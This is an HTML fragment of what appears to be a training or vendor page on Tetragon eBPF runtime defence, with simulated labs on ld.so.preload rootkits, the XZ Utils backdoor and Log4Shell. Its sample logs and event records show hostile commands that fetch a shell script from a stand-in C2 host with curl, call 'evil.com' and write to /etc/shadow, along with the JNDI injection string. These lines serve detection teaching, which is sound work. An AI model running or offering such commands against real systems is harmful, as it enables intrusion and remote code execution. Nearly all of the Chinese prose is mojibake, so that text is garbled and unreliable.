            <div class="mechanism-card" style="margin-top: 40px;">
                <div class="expert-persp-box" style="margin-top:20px; border-left-color: var(--cisco-red); background: #FFF5F5; color: var(--cisco-midnight);">
                    <strong>LSM BPF é˜»æ–­ vs ç”¨æˆ·æ€ LD_PRELOAD åŠ«æŒ</strong>
                    <p style="font-size: 0.95rem; margin-top:10px; opacity:0.9;">åŸºäº <b>LD_PRELOAD</b> çš„ç”¨æˆ·æ€åŠ«æŒæå…¶è„†å¼±ï¼Œæ”»å‡»è€…åªéœ€ä½¿ç”¨é™æ€é“¾æ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶æˆ–æ‰§è¡Œ <code>unset LD_PRELOAD</code> å³å¯è½»æ˜“ç»•è¿‡ç›‘æ§ã€‚è€Œ Tetragon æŒ‚è½½äºå†…æ ¸ <b>LSM BPF</b> æ¥å£ã€‚æ— è®ºæ”»å‡»è€…å¦‚ä½•å°è¯•ä¿®æ”¹è·¯å¾„æˆ–ç¯å¢ƒå˜é‡ï¼Œåªè¦è§¦ç¢°ç³»ç»Ÿèµ„æºï¼Œå°±å¿…é¡»è§¦å‘æ£€æŸ¥ã€‚è¿™æä¾›äº†ç‰©ç†å±‚é¢çš„â€œå®¡è®¡ä¸€è‡´æ€§â€ä¸”å¯¹æ”»å‡»è€…å®Œå…¨é€æ˜ã€‚</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 5: Ancestry -->
    <section id="ancestry-context" style="background: #FFFFFF;">
        <div class="container">
            <div class="section-header">
                <h2>æ·±åº¦ä¸Šä¸‹æ–‡ä¸è¿›ç¨‹æº¯æº</h2>
                <p>åœ¨å®‰å…¨å®¡è®¡ä¸­ï¼Œä»…çŸ¥é“â€œè°è¢«æ€äº†â€æ˜¯ä¸å¤Ÿçš„ï¼Œä½ å¿…é¡»çŸ¥é“å®ƒâ€œä»å“ªå„¿æ¥â€ã€‚Tetragon é€šè¿‡ eBPF ç»´æŠ¤äº†å†…æ ¸æ€çš„è¿›ç¨‹çŠ¶æ€è¡¨ï¼Œå³ä½¿ä¸­é—´çˆ¶è¿›ç¨‹å·²é€€å‡ºï¼Œä¾ç„¶èƒ½å®Œæ•´å›æº¯æ•´ä¸ªæ”»å‡»è·¯å¾„ã€‚</p>
            </div>
            <div style="display: flex; flex-wrap: wrap; gap: 40px; align-items: center;">
                <div style="flex: 1; min-width: 320px;">
                    <div class="ancestry-container">
                        <div class="ancestry-node"><div class="node-icon">C</div><div class="node-info"><div class="node-name">containerd-shim</div><div class="node-meta">PID: 1024</div></div><div class="node-tag">Runtime</div></div>
                        <div class="ancestry-node"><div class="node-icon" style="background: var(--cisco-blue);">S</div><div class="node-info"><div class="node-name">entrypoint.sh</div><div class="node-meta">PID: 1025</div></div><div class="node-tag">Init</div></div>
                        <div class="ancestry-node"><div class="node-icon" style="background: var(--cisco-orange);">J</div><div class="node-info"><div class="node-name">java -jar app.jar</div><div class="node-meta">PID: 1080</div></div><div class="node-tag">App</div></div>
                        <div class="ancestry-node alert"><div class="node-icon" style="background: var(--cisco-red);">B</div><div class="node-info"><div class="node-name">/bin/bash (Reverse Shell)</div><div class="node-meta">PID: 2550</div></div><div class="node-tag" style="background: var(--cisco-red); color: white;">Blocked</div></div>
                    </div>
                </div>
                <div style="flex: 1; min-width: 320px;">
                    <h3>è§£å†³ä¼ ç»Ÿæ—¥å¿—ç¢ç‰‡åŒ–éš¾é¢˜</h3>
                    <p>ä¼ ç»Ÿå·¥å…·ä¾èµ–è¿›ç¨‹äº‹ä»¶æµçš„æ‹¼æ¥ã€‚å¦‚æœä¸€ä¸ªä¸­é—´å±‚è„šæœ¬åœ¨æ”»å‡»å‘ç”Ÿå‰å°±é€€å‡ºï¼Œå®¡è®¡æ—¥å¿—ä¼šå¤±å»å…³è”ã€‚Tetragon åˆ©ç”¨ BPF Map ä¿è¯äº†è¯æ®é“¾çš„å®Œæ•´æ€§ä¸ä¸å¯ä¼ªé€ æ€§ã€‚</p>
                    <div class="highlight-box">
                        <strong>Tetragon çš„ BPF çŠ¶æ€æœºä¼˜åŠ¿ï¼š</strong>
                        <ul style="font-size: 0.95rem; list-style: none; margin-top: 10px;">
                            <li style="margin-bottom: 8px;">âœ… <b>å†…æ ¸æ€æŒä¹…åŒ–ï¼š</b> è¿›ç¨‹ä¿¡æ¯ä¸å—é€€å‡ºçš„å½±å“.</li>
                            <li style="margin-bottom: 8px;">âœ… <b>èº«ä»½è¯†åˆ«è”åŠ¨ï¼š</b> è‡ªåŠ¨å…³è” K8s Pod æ ‡ç­¾.</li>
                            <li>âœ… <b>ä¸å¯ä¼ªé€ ï¼š</b> æ•°æ®æ¥æºäºå†…æ ¸ <code>task_struct</code> éå†.</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 6: Application Scenarios -->
    <section id="scenarios" style="background: #F9FAFB;">
        <div class="container">
            <div class="section-header">
                <h2>åº”ç”¨åœºæ™¯ä¸é˜²å¾¡ä»·å€¼ (Value)</h2>
                <p>å°†å®‰å…¨ç­–ç•¥ä¸‹æ²‰åˆ°å†…æ ¸ï¼Œæ„å»ºä¸å¯ç»•è¿‡çš„è¿è¡Œæ—¶é˜²å¾¡è¾¹ç•Œã€‚</p>
            </div>
            <div class="grid-4">
                <div class="card" style="border-top: 4px solid var(--cisco-red);">
                    <strong>æ·±åº¦é˜²å¾¡ (Security)</strong>
                    <ul style="font-size: 0.85rem; list-style: none; margin-top:10px;">
                        <li style="margin-bottom:8px;">â€¢ <b>æ–‡ä»¶ç¯¡æ”¹ï¼š</b> ç›‘æ§ <code>/etc/passwd</code>, <code>/etc/shadow</code> ç­‰æ•æ„Ÿé…ç½®æ–‡ä»¶çš„ <code>write</code> è¡Œä¸ºã€‚</li>
                        <li style="margin-bottom:8px;">â€¢ <b>åå¼¹ Shellï¼š</b> ç›‘æ§ <code>connect</code> è°ƒç”¨ï¼Œç¦æ­¢éç™½åå•åœ°å€çš„å¤–è¿ä¼ä¼å›¾ã€‚</li>
                        <li>â€¢ <b>å®¹å™¨é€ƒé€¸ï¼š</b> æ£€æµ‹å¼‚å¸¸çš„ Namespace æŒ‚è½½è¡Œä¸ºï¼Œå¼ºåˆ¶æ‰§è¡Œè¾¹ç•Œéš”ç¦»ã€‚</li>
                    </ul>
                </div>
                <div class="card" style="border-top: 4px solid var(--cisco-sky);">
                    <strong>å®‰å…¨åˆè§„ (Compliance)</strong>
                    <p style="font-size: 0.85rem; margin-top: 10px;">å®æ—¶æ£€æµ‹å®¹å™¨å†…æ‰§è¡Œ <code>curl</code>, <code>apt-get</code>, <code>wget</code> ç­‰è¿è§„è¿ç»´å‘½ä»¤ã€‚é€šè¿‡è¡Œä¸ºç™½åå•ç¡®ä¿ç”Ÿäº§ç¯å¢ƒçš„â€œä¸å¯å˜æ€§ï¼ˆImmutabilityï¼‰â€ï¼Œæ»¡è¶³ SOC2/PCI-DSS åˆè§„æ€§å®¡è®¡ã€‚</p>
                </div>
                <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                    <strong>æ•…éšœæ’æŸ¥ & é›¶ä¿¡ä»»</strong>
                    <p style="font-size: 0.85rem; margin-top: 10px;">é€šè¿‡ç›‘æ§ TCP SYN é‡ä¼ å®šä½ç½‘ç»œå»¶è¿Ÿç“¶é¢ˆã€‚åŸºäº Kubernetes èº«ä»½æ‰§è¡Œâ€œæœ€å°æƒé™è®¿é—®â€ç­–ç•¥ï¼Œç¡®ä¿è¿›ç¨‹åªèƒ½è®¿é—®å£°æ˜çš„å¤–éƒ¨åŸŸåã€‚</p>
                </div>
                <div class="card" style="border-top: 4px solid var(--cisco-midnight);">
                    <strong>å–è¯åˆ†æ (Forensics)</strong>
                    <p style="font-size: 0.85rem; margin-top: 10px;">å…¥ä¾µå‘ç”Ÿåï¼Œåˆ©ç”¨ Tetragon çš„æ·±åº¦ç¥–å…ˆè¿›ç¨‹æ ‘å›æº¯æ”»å‡»è€…çš„æ¨ªå‘ç§»åŠ¨è½¨è¿¹ã€æŒ‡ä»¤æ‰§è¡Œåºåˆ—åŠç¯å¢ƒå˜é‡æŒ‡çº¹ï¼Œæä¾›æ³•åº­çº§è¯æ®é“¾ã€‚</p>
                </div>
            </div>

            <div class="view-section" style="margin-top: 80px;">
                <div class="view-title">å®‰å…¨ç®¡é“é›†æˆ (Security Pipeline)</div>
                <p>Tetragon ä¸ä»…ä»…æ˜¯ä¸€ä¸ªé˜»æ–­å·¥å…·ï¼Œæ›´æ˜¯ç°ä»£ SOC çš„æ ¸å¿ƒæ•°æ®æºã€‚å®ƒå°†å†…æ ¸åŸå§‹ä¿¡å·è½¬åŒ–ä¸ºç»“æ„åŒ–çš„ JSON äº‹ä»¶æµã€‚</p>
                <div class="pipeline-container">
                    <div class="pipeline-node">
                        <strong>Kernel Hook</strong>
                        <p style="font-size: 0.75rem;">eBPF Signals</p>
                    </div>
                    <div style="font-weight:bold; color: var(--cisco-blue);">â†’</div>
                    <div class="pipeline-node" style="border-color: var(--cisco-orange);">
                        <strong>Tetragon Agent</strong>
                        <p style="font-size: 0.75rem;">Identity Enrichment</p>
                    </div>
                    <div style="font-weight:bold; color: var(--cisco-blue);">â†’</div>
                    <div class="pipeline-node" style="border-color: var(--cisco-midnight);">
                        <strong>gRPC / JSON Export</strong>
                        <p style="font-size: 0.75rem;">Structured Telemetry</p>
                    </div>
                    <div style="font-weight:bold; color: var(--cisco-blue);">â†’</div>
                    <div class="pipeline-node" style="border-color: var(--cisco-sky);">
                        <strong>Splunk / Cisco XDR</strong>
                        <p style="font-size: 0.75rem;">Alerting & Visualization</p>
                    </div>
                </div>

                <div class="yaml-block" style="border-left-color: var(--cisco-blue);">
<span style="color: #6A9955;">// Typical Tetragon JSON Event Schema</span>
{
  <span class="yaml-key">"process_exec"</span>: {
    <span class="yaml-key">"process"</span>: { <span class="yaml-key">"pod"</span>: { <span class="yaml-key">"name"</span>: <span class="yaml-val">"payment-app-84f"</span>, <span class="yaml-key">"namespace"</span>: <span class="yaml-val">"prod"</span> }, <span class="yaml-key">"binary"</span>: <span class="yaml-val">"/usr/bin/curl"</span> },
    <span class="yaml-key">"arguments"</span>: <span class="yaml-val">"http://malicious-c2.io/shell.sh"</span>,
    <span class="yaml-key">"action"</span>: <span class="yaml-val">"KILLED"</span>
  }
}</div>
            </div>
        </div>
    </section>

    <!-- Section 7: Policy Discovery -->
    <section id="policy-discovery" style="background: white; border-bottom: 1px solid var(--cisco-platinum);">
        <div class="container">
            <div class="section-header">
                <h2>ç­–ç•¥å‘ç°ï¼šä»è§‚æµ‹åˆ°é˜²å¾¡çš„è‡ªåŠ¨åŒ–è½¬åŒ–</h2>
                <p>å®‰å…¨ç­–ç•¥ä¸åº”é æ‰‹åŠ¨çŒœæµ‹ã€‚Tetragon å¯ä»¥é€šè¿‡è§‚æµ‹ä¸šåŠ¡åœ¨æµ‹è¯•ç¯å¢ƒçš„æ­£å¸¸è¡Œä¸ºï¼Œè‡ªåŠ¨å‘ç°å¹¶æç‚¼å®‰å…¨ç­–ç•¥ã€‚</p>
            </div>
            <div class="discovery-card">
                <div class="log-side" id="log-view">
                    <div style="color: #6CC24A; margin-bottom: 15px; font-weight: bold;">[OBSERVABILITY LOG STREAM]</div>
                    <div class="log-line">{"process": "java", "op": "exec", "target": "whoami"}</div>
                    <div class="log-line highlight">{"process": "java", "op": "exec", "target": "curl", "args": ["evil.com"]}</div>
                    <div class="log-line">{"process": "nginx", "op": "connect", "dest": "10.0.0.1"}</div>
                    <div class="log-line highlight">{"process": "bash", "op": "write", "path": "/etc/shadow"}</div>
                </div>
                <div class="policy-side">
                    <div class="policy-header">
                        <strong style="color: var(--cisco-midnight);">TracingPolicy é¢„è§ˆ</strong>
                        <span id="discovery-status" style="font-size: 0.75rem;">å¾…ç”Ÿæˆ...</span>
                    </div>
                    <div id="policy-container" style="height: 220px; border: 1px solid #E4E4E4; border-radius: 8px; padding: 15px; background: #FAFAFA; overflow: hidden;">
                        <div id="empty-policy-text" style="text-align: center; color: #999; padding-top: 80px;">ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®æå–ç­–ç•¥</div>
                        <div id="generated-yaml" style="display: none; font-family: monospace; font-size: 0.8rem; white-space: pre; color: #333;">
<span style="color: #005cc5;">apiVersion</span>: <span style="color: #032f62;">cilium.io/v1alpha1</span>
<span style="color: #005cc5;">kind</span>: <span style="color: #032f62;">TracingPolicy</span>
<span style="color: #005cc5;">spec</span>:
  <span style="color: #005cc5;">kprobes</span>:
  - <span style="color: #005cc5;">call</span>: <span style="color: #032f62;">"sys_execve"</span>
    <span style="color: #005cc5;">selectors</span>:
    - <span style="color: #005cc5;">matchBinaries</span>:
      - <span style="color: #005cc5;">values</span>: [<span style="color: #032f62;">"/usr/bin/curl"</span>]
      <span style="color: #005cc5;">matchActions</span>:
      - <span style="color: #005cc5;">action</span>: <span style="color: #d73a49;">Sigkill</span></div>
                    </div>
                    <div style="margin-top: 20px; text-align: center;">
                        <button class="btn-primary" id="discover-btn" onclick="startDiscovery()" style="background: var(--cisco-blue); color: white; border: none; padding: 12px 24px; border-radius: 20px; font-weight: 600; cursor: pointer;">è½¬æ¢ä¸ºé˜²å¾¡ç­–ç•¥</button>
                    </div>
                </div>
            </div>

            <div class="view-section" style="margin-top: 40px;">
                <div class="view-title">è¿›é˜¶ç­–ç•¥ï¼šè”åŠ¨èº«ä»½ä¸æ·±åº¦å‚æ•°è¿‡æ»¤</div>
                <p>åœ¨å¤æ‚çš„ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ›´ç²¾å‡†çš„é˜²å¾¡ã€‚ä¾‹å¦‚ï¼šåªå…è®¸ç‰¹å®šçš„ Pod è®¿é—®ç‰¹å®šçš„æ–‡ä»¶è·¯å¾„ã€‚</p>
                <div class="yaml-block" style="border-left-color: var(--cisco-midnight);">
<span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"deep-defense-demo"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">podSelector</span>:
    <span class="yaml-key">matchLabels</span>:
      <span class="yaml-key">app</span>: <span class="yaml-val">"payment-gateway"</span>  <span style="color: #6A9955;"># ä»…å¯¹æ”¯ä»˜ç½‘å…³ Pod ç”Ÿæ•ˆ</span>
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_openat"</span>
    <span class="yaml-key">matchArgs</span>:
    - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
      <span class="yaml-key">operator</span>: <span class="yaml-val">"Prefix"</span>
      <span class="yaml-key">values</span>: [<span class="yaml-val">"/etc/pki"</span>] <span style="color: #6A9955;"># ç›‘æ§å¯¹è¯ä¹¦ç›®å½•çš„è®¿é—®</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchBinaries</span>:
      - <span class="yaml-key">operator</span>: <span class="yaml-val">"NotIn"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/usr/bin/nginx"</span>] <span style="color: #6A9955;"># å…è®¸ Nginxï¼Œé˜»æ­¢å…¶ä»–ä¸€åˆ‡è¿›ç¨‹</span>
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span>   <span style="color: #6A9955;"># å®æ—¶å†…æ ¸æ€é˜»æ–­</span></div>
            </div>

            <div id="discovery-msg" style="display:none; text-align: center; color: var(--cisco-green); font-weight: bold;">âœ… ç­–ç•¥å·²æå–å¹¶å‡†å¤‡åº”ç”¨è‡³å®éªŒå®¤ï¼</div>
            <div id="sync-hint" style="display:none; text-align: center; font-size: 0.85rem; color: var(--cisco-midnight); margin-top: 10px;">ğŸ’¡ è¯¥ç­–ç•¥å·²è‡ªåŠ¨åŒæ­¥è‡³ Scenario I å®éªŒç¯å¢ƒ</div>
        </div>
    </section>

    <!-- Section 8: Lab Section -->
    <section id="lab-section" style="background: #F9FAFB;">
        <div class="container">
            <!-- Winston's Roadmap Hint -->
            <p style="color: var(--cisco-blue); font-weight: 600; text-align: center; margin-bottom: 20px;">[ 4/4: å®æˆ˜æ¼”ç»ƒ ]</p>

            <div class="section-header">
                <h2>å®æ—¶æ”»é˜²æ¼”ç»ƒå®éªŒå®¤</h2>
                <p>æ²‰æµ¸å¼ä½“éªŒå†…æ ¸çº§å¨èƒé˜»æ–­ã€‚è¯·åœ¨ä¸‹æ–¹å®éªŒåœºæ™¯ä¸­ç‚¹å‡»â€œå¯åŠ¨æ¼”ç»ƒâ€ã€‚</p>
            </div>

            <!-- Winston's Memory Hook: Why we do this -->
            <div style="background: #FFF; border: 1px solid var(--cisco-blue); padding: 20px; border-radius: 8px; margin-bottom: 30px; text-align: center;">
                <p style="margin:0; font-weight: bold; color: var(--cisco-midnight);">
                    â€œHear and you forget; see and you remember; DO and you understand.â€ 
                </p>
                <p style="margin:5px 0 0; font-size: 0.85rem; color: #666;">
                    é€šè¿‡ä»¥ä¸‹ä¸‰ä¸ªçœŸå®ä¸–ç•Œçš„æ¼æ´åˆ©ç”¨åœºæ™¯ï¼Œè§‚å¯Ÿ Tetragon å¦‚ä½•åœ¨æ¯«ç§’é—´ç²‰ç¢æ”»å‡»è€…çš„æŒä¹…åŒ–ä¼å›¾ã€‚
                </p>
            </div>

            <!-- LAB 0: Installation & Setup Simulation -->
            <div class="mechanism-card" id="card-scenario-0">
                <div class="enforcement-status" id="status-0"><div class="status-dot"></div><span class="status-text">MODE: MONITORING</span></div>
                <div class="case-badge" style="background: var(--cisco-midnight);">Scenario 0</div>
                <h4 style="border-left-color: var(--cisco-midnight);">Tetragon éƒ¨ç½²ä¸ç­–ç•¥ä¸‹å‘</h4>
                <div class="view-section">
                    <p>åœ¨å¼€å§‹é˜²å¾¡ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å°† Tetragon æ³¨å…¥åˆ°åŸºç¡€è®¾æ–½ä¸­ã€‚Tetragon æ”¯æŒå¤šç§ç¯å¢ƒï¼Œèƒ½å¤Ÿæ— ç¼æ„ŸçŸ¥äº‘åŸç”Ÿä¸Šä¸‹æ–‡ã€‚</p>
                    <div class="tab-container">
                        <div class="tab-header">
                            <button class="tab-btn active" id="btn-tab-k8s" onclick="switchSetupTab('k8s')">Kubernetes (Helm)</button>
                            <button class="tab-btn" id="btn-tab-linux" onclick="switchSetupTab('linux')">Linux åŸç”Ÿ (Binary)</button>
                        </div>
                    </div>
                    <div id="setup-description">
                        <div id="setup-k8s" class="setup-detail">
                            <p><strong>Kubernetes éƒ¨ç½²ï¼š</strong>é€šè¿‡ Helm ä»“åº“å®‰è£…ã€‚Tetragon ä¼šä»¥ DaemonSet å½¢å¼è¿è¡Œåœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šï¼Œè‡ªåŠ¨æŒ‚è½½ eBPF ç¨‹åºå¹¶ç›‘å¬ API Serverã€‚</p>
                        </div>
                        <div id="setup-linux" class="setup-detail" style="display:none;">
                            <p><strong>Linux åŸç”Ÿéƒ¨ç½²ï¼š</strong>é€‚ç”¨äºéå®¹å™¨åŒ–ç¯å¢ƒæˆ–è¾¹ç¼˜èŠ‚ç‚¹ã€‚ç›´æ¥è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€šè¿‡æœ¬åœ° YAML æ–‡ä»¶ä¸‹å‘ç­–ç•¥ï¼Œåˆ©ç”¨ systemd ä¿è¯æŒä¹…è¿è¡Œã€‚</p>
                        </div>
                    </div>
                </div>
                <div style="display: flex; gap: 12px; margin-top: 15px;">
                    <button class="btn-primary" onclick="runSetupSimulation()" id="setupBtn" style="background: var(--cisco-midnight); color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">æ‰§è¡Œå®‰è£…ä¸ç­–ç•¥ä¸‹å‘</button>
                    <button class="btn-outline" onclick="resetTerminal('setupOutput')" style="background: transparent; border: 1px solid var(--cisco-midnight); color: var(--cisco-midnight); padding: 10px 20px; border-radius: 20px; cursor: pointer;">æ¸…ç©ºç»ˆç«¯</button>
                </div>
                <div class="terminal" id="term-wrap-0">
                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
                    <div class="terminal-content" id="setupOutput">
                        <div class="login-info">Infrastructure Console Initialized...</div>
                        <div><span class="prompt">admin@infra:~$</span> <span class="cursor"></span></div>
                    </div>
                </div>
            </div>

            <!-- LAB 1: ROOTKIT (Scenario I) -->
            <div class="mechanism-card" id="card-scenario-1">
                <div class="enforcement-status" id="status-1"><div class="status-dot"></div><span class="status-text">MODE: MONITORING</span></div>
                <div class="case-badge">Scenario I</div>
                <span class="mitre-tag">MITRE T1546.012</span>
                <h4>Rootkit æŒä¹…åŒ–æ‹¦æˆª</h4>
                <div class="view-section">
                    <p><strong>æ”»å‡»åŸç†ï¼šåŠ«æŒåŠ¨æ€é“¾æ¥ã€‚</strong>æ”»å‡»è€…å¸¸å°è¯•ä¿®æ”¹ç³»ç»Ÿå…³é”®é…ç½®æ–‡ä»¶ <code>/etc/ld.so.preload</code>ã€‚åœ¨è¯¥æ–‡ä»¶ä¸­æ·»åŠ æ¶æ„åŠ¨æ€åº“è·¯å¾„åï¼Œç³»ç»Ÿåœ¨å¯åŠ¨ä»»ä½•æ–°è¿›ç¨‹æ—¶éƒ½ä¼šå¼ºåˆ¶åŠ è½½è¯¥æ¶æ„åº“ã€‚è¿™ä½¿å¾—é»‘å®¢èƒ½åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼ˆå¦‚ <code>read</code>, <code>write</code>, <code>execve</code>ï¼‰ï¼Œå®ç°å®Œå…¨çš„â€œéšèº«â€ç›‘æ§å’Œåé—¨æŒä¹…åŒ–ã€‚</p>
                    <p><strong>Tetragon å¯¹ç­–ï¼š</strong>é…ç½®ç›‘æ§è¯¥æ–‡ä»¶çš„ <code>sys_openat</code> è°ƒç”¨ã€‚ä¸€æ—¦æ£€æµ‹åˆ°å°è¯•ä»¥â€œå†™å…¥â€æ¨¡å¼æ‰“å¼€è¯¥æ–‡ä»¶çš„éé¢„æœŸè¿›ç¨‹ï¼ˆå¦‚ Shell è„šæœ¬ï¼‰ï¼ŒTetragon ä¼šç«‹å³å®æ–½å†…æ ¸çº§é˜»æ–­ã€‚</p>
                </div>
                <div class="yaml-block">
<span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"protect-ld-so-preload"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_openat"</span>
    <span class="yaml-key">matchArgs</span>:
    - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
      <span class="yaml-key">values</span>: [<span class="yaml-val">"/etc/ld.so.preload"</span>]
    <span class="yaml-key">matchActions</span>:
    - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
                <div style="display: flex; gap: 12px; margin-top: 15px;">
                    <button class="btn-primary" onclick="runAttackSequence()" id="attackBtn" style="background: var(--cisco-blue); color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">å¯åŠ¨æ¼”ç»ƒ</button>
                    <button class="btn-outline" onclick="resetTerminal('termOutput')" style="background: transparent; border: 1px solid var(--cisco-blue); color: var(--cisco-blue); padding: 10px 20px; border-radius: 20px; cursor: pointer;">é‡ç½®ç»ˆç«¯</button>
                </div>
                <div class="terminal" id="term-wrap-1">
                    <div class="shield-watermark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
                    <div class="terminal-content" id="termOutput">
                        <div class="login-info">Last login: Today from 192.168.1.5</div>
                        <div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>
                    </div>
                </div>
            </div>

            <!-- LAB 2: XZ UTILS (Scenario II) -->
            <div class="mechanism-card" id="card-scenario-2">
                <div class="enforcement-status" id="status-2"><div class="status-dot"></div><span class="status-text">MODE: MONITORING</span></div>
                <div class="case-badge">Scenario II</div>
                <span class="mitre-tag">MITRE T1574.002</span>
                <h4>XZ Utils ä¾›åº”é“¾æ”»å‡» (CVE-2024-3094)</h4>
                <div class="view-section">
                    <p><strong>æ”»å‡»æœºç†ï¼šIFUNC åŠ«æŒã€‚</strong>XZ åé—¨åˆ©ç”¨äº† GNU é“¾æ¥å™¨çš„ <b>Indirect Function (IFUNC)</b> æœºåˆ¶ã€‚æ”»å‡»è€…æ³¨å…¥æ¶æ„ SOï¼Œåœ¨ <code>sshd</code> åŠ è½½ <code>liblzma</code> æ—¶é€šè¿‡é—´æ¥å‡½æ•°è§£æå°†æ­£å¸¸çš„ RSA è®¤è¯é€»è¾‘æ›¿æ¢ä¸ºåé—¨é€»è¾‘ã€‚è¿™ç§â€œå†…å­˜ä¸­åé—¨â€ä¸ä¼šåœ¨ç£ç›˜ä¸Šç•™ä¸‹å¼‚å¸¸ç—•è¿¹ã€‚</p>
                    <p><strong>æ£€æµ‹ä¸é˜»æ–­ï¼š</strong>ç”±äºåé—¨æ¿€æ´»åå¿…é¡»é€šè¿‡ <code>execve</code> æ´¾ç”Ÿå­è¿›ç¨‹æ‰èƒ½æ‰§è¡Œæ¶æ„å‘½ä»¤ï¼ŒTetragon é€šè¿‡é”å®š <code>sshd</code> äºŒè¿›åˆ¶è·¯å¾„ï¼Œæ„Ÿåº”å¹¶æ€æ‰éé¢„æœŸçš„ <code>/bin/sh</code> æ´¾ç”Ÿè¡Œä¸ºã€‚</p>
                </div>
                <div class="yaml-block">
<span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"block-sshd-fork"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_execve"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchBinaries</span>:
      - <span class="yaml-key">operator</span>: <span class="yaml-val">"In"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/usr/sbin/sshd"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
                <div style="display: flex; gap: 12px; margin-top: 15px;">
                    <button class="btn-primary" onclick="runXZSimulation()" id="xzBtn" style="background:var(--cisco-midnight); color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">å¯åŠ¨æ¼”ç»ƒ</button>
                    <button class="btn-outline" onclick="resetTerminal('xzOutput')" style="background: transparent; border: 1px solid var(--cisco-midnight); color: var(--cisco-midnight); padding: 10px 20px; border-radius: 20px; cursor: pointer;">é‡ç½®ç»ˆç«¯</button>
                </div>
                <div class="terminal" id="term-wrap-2">
                    <div class="shield-watermark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
                    <div class="terminal-content" id="xzOutput">
                        <div class="login-info">Last login: Today from 10.128.0.45</div>
                        <div><span class="prompt">root@prod-node:~$</span> <span class="cursor"></span></div>
                    </div>
                </div>
            </div>

            <!-- LAB 3: LOG4SHELL (Scenario III) -->
            <div class="mechanism-card" id="card-scenario-3">
                <div class="enforcement-status" id="status-3"><div class="status-dot"></div><span class="status-text">MODE: MONITORING</span></div>
                <div class="case-badge">Scenario III</div>
                <span class="mitre-tag">MITRE T1190</span>
                <h4>Log4Shell æ¼æ´é˜²æŠ¤ (CVE-2021-44228)</h4>
                <div class="view-section">
                    <p><strong>JNDI æ³¨å…¥åŸç†ï¼šé€’å½’è§£æåŠ«æŒã€‚</strong>Log4j åº“æ ¼åœ¨å¤„ç†æ—¥å¿—æ—¶ä¼šé€’å½’è§£æ <code>${jndi:ldap://...}</code> å­—ç¬¦ä¸²ã€‚è¿™å¼ºåˆ¶ Java åº”ç”¨è¿æ¥è¿œç¨‹æœåŠ¡å™¨ä¸‹è½½å¹¶æ‰§è¡Œæ¶æ„å­—èŠ‚ç ã€‚è¿™æ˜¯å…¸å‹çš„ä»â€œåˆè§„åº”ç”¨å±‚è¡Œä¸ºâ€è½¬åŒ–ä¸ºâ€œæ¶æ„å†…æ ¸çº§è¡Œä¸ºâ€çš„æ¡ˆä¾‹ã€‚</p>
